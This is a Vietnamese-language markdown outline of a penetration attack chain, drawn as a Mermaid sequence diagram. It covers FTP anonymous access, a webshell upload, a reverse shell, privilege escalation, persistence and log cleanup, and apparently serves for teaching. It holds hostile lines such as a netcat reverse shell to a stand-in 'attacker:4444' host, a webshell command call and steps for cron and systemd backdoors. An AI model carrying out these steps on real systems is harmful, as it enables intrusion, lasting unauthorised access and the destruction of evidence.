# Real-World Attack Chain  
## FTP → Webshell → Reverse Shell → PrivEsc → Persistence

Tài liệu này mô tả toàn bộ chuỗi tấn công dưới dạng **Mermaid Sequence Diagram**, từ lúc attacker phát hiện FTP misconfig cho tới khi đạt được **root + persistence**.

---

## 1. Sequence Diagram – Toàn bộ luồng tấn công

```mermaid
sequenceDiagram
    autonumber

    participant A as Attacker
    participant F as FTP Server
    participant W as Web Server
    participant L as Target OS
    participant P as Persistence

    Note over A: Stage 1 - FTP enumeration and initial access

    A->>F: Nmap scan port 21 (sC sV ftp-anon)
    F-->>A: Anonymous allowed and writable directory found

    A->>F: FTP login (anonymous or weak creds)
    F-->>A: Login successful

    A->>F: Upload webshell.php
    F-->>A: File stored successfully

    Note over F: FTP folder is mapped to webroot

    A->>W: HTTP GET /uploads/shell.php?cmd=id
    W->>L: Execute system('id')
    L-->>W: Output returned
    W-->>A: id output returned

    Note over W: Stage 2 - RCE and reverse shell

    A->>W: Trigger reverse shell payload
    W->>L: Run nc -e /bin/bash attacker:4444
    L-->>A: Reverse shell established

    A->>L: Stabilize shell with pty + stty

    Note over L: Stage 3 - Local enumeration

    A->>L: Run id, uname -a, sudo -l
    L-->>A: System info and sudo rights

    A->>L: Enumerate SUID, cron, configs
    L-->>A: SUID binaries, cron jobs, credentials

    Note over L: Stage 4 - Privilege escalation

    alt SUID based privesc
        A->>L: Exploit SUID binary
        L-->>A: Root shell
    else sudo misconfiguration
        A->>L: Run sudo exploit (GTFOBins)
        L-->>A: Root shell
    else cronjob abuse
        A->>L: Inject reverse shell into cron script
        L-->>A: Root shell from cron
    else password reuse
        A->>L: su or ssh using reused password
        L-->>A: Root shell
    end

    Note over P: Stage 5 - Persistence and cleanup

    A->>P: Add SSH key persistence
    P-->>A: SSH root access enabled

    A->>P: Install systemd service or cron backdoor
    P-->>A: Scheduled reverse shell active

    A->>L: Cleanup logs and history
    L-->>A: Logs cleaned

    Note over A: Final result - Root access and persistence established


```

---

## 2. Tóm tắt chuỗi tấn công

1. **FTP Enumeration**
2. **Initial Access (Anonymous/Weak Login)**
3. **Upload Webshell → RCE**
4. **Reverse Shell**
5. **Local Enumeration**
6. **Privilege Escalation**
7. **Persistence (SSH key, systemd, cron)**
8. **Anti-Forensics**

---
